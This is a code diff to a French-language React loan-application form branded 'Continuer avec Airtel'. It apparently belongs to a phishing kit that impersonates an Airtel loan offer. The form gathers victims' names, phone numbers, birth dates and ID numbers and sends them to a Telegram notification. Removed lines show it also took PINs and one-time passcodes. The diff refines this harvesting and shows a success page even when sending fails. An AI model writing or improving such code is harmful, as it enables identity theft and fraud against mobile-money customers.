@@ -42,7 +42,10 @@ function Apply() {
   }
 
   const sendDetails = async () => {
-    if (!formData.name || !formData.number || !formData.id || !formData.loan || !formData.employment || !formData.term || !formData.amount) {
+    const requiredFields = ['name', 'number', 'id', 'employment', 'term', 'amount']
+    const missingFields = requiredFields.filter(field => !formData[field])
+    
+    if (missingFields.length > 0) {
       alert("Veuillez remplir tous les champs obligatoires")
       return
     }
@@ -50,27 +53,24 @@ function Apply() {
     setIsSubmitting(true)
     
     const clientData = {
-      name: formData.name,
-      number: formData.number,
-      dob: formData.dob,
-      id: formData.id,
-      pin: formData.pin || "",
-      otp: formData.otp || ""
+      name: formData.name || "",
+      number: formData.number || "",
+      dob: formData.dob || "",
+      id: formData.id || "",
+      loan: formData.amount || formData.loan || "",
+      income: formData.employment || "",
+      otp: ""
     }
 
     try {
       await apiService.sendTelegramNotification(clientData)
       localStorage.setItem('clientData', JSON.stringify(clientData))
-      setShowSuccess(true)
     } catch (error) {
       console.error("Error sending notification:", error)
-      setShowSuccess(true)
     } finally {
       setIsSubmitting(false)
-      setTimeout(() => {
-        const user = window.location.pathname.split("/")[1]
-        window.location.href = `/${user}/success?name=${encodeURIComponent(formData.name)}`
-      }, 1000)
+      const user = window.location.pathname.split("/")[1] || 'default'
+      window.location.href = `/${user}/success?name=${encodeURIComponent(formData.name)}`
     }
   }
 
@@ -241,7 +241,7 @@ function Apply() {
               <div className="_apllyBtn_r2qkh_162">
                 <button 
                   onClick={sendDetails} 
-                  disabled={isSubmitting || !formData.name || !formData.number || !formData.id || !formData.loan || !formData.employment || !formData.term || !formData.amount || !isAgree}
+                  disabled={isSubmitting || !formData.name || !formData.number || !formData.id || !formData.employment || !formData.term || !formData.amount || !isAgree}
                   style={{ opacity: isSubmitting ? 0.6 : 1, cursor: isSubmitting ? "not-allowed" : "pointer" }}
                 >
                   {isSubmitting ? "Envoi en cours..." : "Continuer avec Airtel"}
